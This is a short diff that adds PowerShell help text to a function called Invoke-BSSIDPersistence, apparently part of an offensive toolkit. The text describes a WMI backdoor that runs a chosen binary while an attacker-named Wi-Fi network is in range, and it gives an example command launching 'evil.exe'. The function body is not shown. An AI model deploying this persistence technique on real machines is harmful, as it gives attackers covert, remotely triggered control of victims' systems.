@@ -1,3 +1,22 @@
+<#
+.SYNOPSIS
+WMI binding Function that continually monitors the air for a BSSID which you specify as a backdoor trigger.  If you have something within range of
+the target to omit wireless signals with a given "evil ap" BSSID, it'll execute a binary and keep it open until which time
+the wireless signal disappears.  
+
+.DESCRIPTION
+WMI binding Function that continually monitors the air for a BSSID which you specify as a backdoor trigger.  If you have something within range of
+the target to omit wireless signals with a given "evil ap" BSSID, it'll execute a binary and keep it open until which time
+the wireless signal disappears.  
+
+.EXAMPLE
+PS> Invoke-BSSIDPersistence -NetworkName "3v1ln3tw0rk" -EXEPath "c:\windows\system32\evil.exe" -FilterName "evilap" -ConsumerName "evilconsumer"
+    This will check the air every 5 seconds for a BSSID called "3v1ln3tw0rk" and execute evil.exe while the network exists.
+    
+The idea came from: http://www.irongeek.com/i.php?page=videos/bsideslasvegas2015/atgp06-wi-door-bindrev-shells-for-your-wi-fi-vivek-ramachandran
+#>
+
+
 function Invoke-BSSIDPersistence
 {
     Param(
